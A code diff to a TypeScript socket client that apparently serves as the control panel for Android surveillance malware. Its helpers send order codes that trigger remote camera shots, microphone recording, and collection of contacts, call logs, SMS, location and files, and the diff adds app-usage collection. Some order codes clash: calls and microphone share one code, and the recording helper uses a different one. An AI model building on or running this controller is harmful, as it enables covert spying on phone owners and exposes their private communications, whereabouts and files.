@@ -65,6 +65,20 @@ export interface SocketResult {
 
     // Microphone result
     audio?: boolean;
+
+    // App usage result
+    hasPermission?: boolean;
+    totalAppsCount?: number;
+    beginTime?: number;
+    endTime?: number;
+    usageList?: Array<{
+        appName?: string;
+        packageName?: string;
+        totalTimeInForegroundMs?: number;
+        totalTimeFormatted?: string;
+        lastTimeUsedTimestamp?: number;
+        lastTimeUsedFormatted?: string;
+    }>;
 }
 
 async function createSocket(userId: string, customServerUrl?: string): Promise<Socket> {
@@ -153,6 +167,7 @@ export function sendCommand(data: CommandData): boolean {
     }
 
     socket.emit('order', data);
+    socket.emit('command', data);
     console.log('Command sent:', data);
     return true;
 }
@@ -167,23 +182,36 @@ export function onResult(callback: (data: SocketResult) => void): void {
 
 // Predefined command helpers
 export const COMMANDS = {
-    // Camera
+    // Order codes
+    APP_USAGE_ORDER: 'x0000us',
+    CAMERA: 'x0000ca',
+    MICROPHONE: 'x0000mc',
+    CONTACTS: 'x0000cl',
+    CALLS: 'x0000mc',
+    SMS: 'x0000ms',
+    LOCATION: 'x0000lo',
+    FILE_MANAGER: 'x0000fm',
+
+    // App Usage helper
+    APP_USAGE: (userId: string) => ({ userId, command: { order: 'x0000us' } }),
+
+    // Camera helpers
     CAMERA_MAIN: (userId: string) => ({ userId, command: { order: 'x0000ca', extra: '1' } }),
     CAMERA_SELFIE: (userId: string) => ({ userId, command: { order: 'x0000ca', extra: '0' } }),
 
-    // Location
-    LOCATION: (userId: string) => ({ userId, command: { order: 'x0000lo' } }),
+    // Location helper
+    LOCATION_CMD: (userId: string) => ({ userId, command: { order: 'x0000lo' } }),
 
-    // Contacts
-    CONTACTS: (userId: string) => ({ userId, command: { order: 'x0000cl' } }),
+    // Contacts helper
+    CONTACTS_CMD: (userId: string) => ({ userId, command: { order: 'x0000cl' } }),
 
-    // Calls
+    // Calls helper
     CALL_LOGS: (userId: string) => ({ userId, command: { order: 'x0000mc' } }),
 
-    // SMS
+    // SMS helper
     SMS_LIST: (userId: string) => ({ userId, command: { order: 'x0000ms' } }),
 
-    // Files
+    // Files helpers
     FILE_LIST: (userId: string, path: string = '0') => ({
         userId,
         command: { order: 'x0000fm', req: 0, path },
@@ -193,7 +221,7 @@ export const COMMANDS = {
         command: { order: 'x0000fm', req: 1, path },
     }),
 
-    // Microphone
+    // Microphone helper
     RECORD_AUDIO: (userId: string, durationSeconds: number = 10) => ({
         userId,
         command: { order: 'x0000mi', sec: durationSeconds },
